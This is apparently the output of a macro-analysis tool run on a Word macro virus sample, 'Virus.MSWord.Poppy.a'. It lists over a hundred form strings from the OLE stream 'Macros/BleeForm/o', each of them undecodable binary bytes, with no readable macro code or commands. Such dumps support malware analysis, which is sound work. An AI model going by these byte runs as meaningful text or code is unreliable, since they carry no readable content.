- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q#�X)�8�G���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U+�}ӷP�KE����i6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�\�������:�z�ZMܺ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���9��0<ǌpH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~,/��t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ʂ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����T	�����{)�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��U��T�Dc"�NJ�K`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6���)����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7z2���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T��s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I#�H1ʤ�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��6���k����G�!�R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
45.�[)GF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�h�X��ot
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z9m���h�T�K+VZ���UT�M!�ya$e��!7$Q�b0L�I`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F�^����X���i	:�?Y[�顎�jJ{r��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

B�**��7�4�@�6����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ܮ�Zd�Ik
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+G1u���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�D���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��Ƃ��`{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�J:��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wi�۸G��N7(7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���	)j�Zə^[IH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��32�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Gx�@~uO�=me
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�R���Vh>!�2��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ygV`����z\F�
9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��zO)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�ҒYN�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
�8!i������6�+b���Tj'��s��5�6eF�]��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 2I&���R_Y���}�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W�CWYK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&PW1�8 �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��vN6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s7�T�z�����"���c+[5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��K*a�xV#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H6뙺=N����O5dh)�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{?x#VV*��U%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ֆk��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tg��T�%����)tR[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RQO�Ӑ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�MqO��U�P�H��E�T���Ƞ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@RY��Z=C�2]H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(YR:���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y	e|�6d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{.vr��}?Ov
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�WZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%�d���Ā�$�	9'�&��m6�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m}l9�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�r�睭��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ū��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

���ܴQ�֣F�NT)����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:8� �~�o�UJ�bs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:,]��c�z��b����G��@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ⴉ�W#�{���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?n�v�ym��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8 ���z'u3U�j�I媶���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=��B+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӣE�%��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n~�7��?��I�����"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ϩ'��h믴p,T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�-$Lą�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,��`y��띡FA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DZ���	z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��犦�MIV��eI<����	��q���9��1�M�����[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'���3�砂|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�עa���5v������~��x1$2�2:6�Cc%�$���#�z�WAMN�����$4�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	l&AR�K��V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H���T����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����?��wp��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t���V�
�AE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SZ���OK�U�g�!Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݝq�eX�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oq��mF�;	�e�!G͒q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鎽wU]��>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ve��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�Ib��o5l[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�@O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
W\�M�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Ԇ)�A(X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����^;U�4.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U*�^*b���]��������r	,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c���Ԗ��a�����i�O$�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Iǡ����}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�8�tgCc�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�t��=�X�S�$�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�׎�/�R44�$�۳����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��M_G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�B�#P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Xt�j�(��qM+y�I�9�"���P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǁ�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�Qu�3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s0|T�r��Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P��BJ�rž���{����)���ce���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�^y���3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U0=3�J�t�����im� ��4�$x�"��(��r���A 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZF�A	g
f���s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��˸9M��$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��'���c��_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{&QL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����QK�CW�UW�;枪Y�$eU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ȃo9%�wˀ���o�y�ձ�"��&_<n��č�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|ˁ�9c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/����@C��L	vr�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VIN!��(�zI�)���5y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t��*�&|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�G�Z�����A]-<x���:3G���(1�9����n��A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�5�;��i�_�� ��1�2�F�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|F0� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�y�|L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
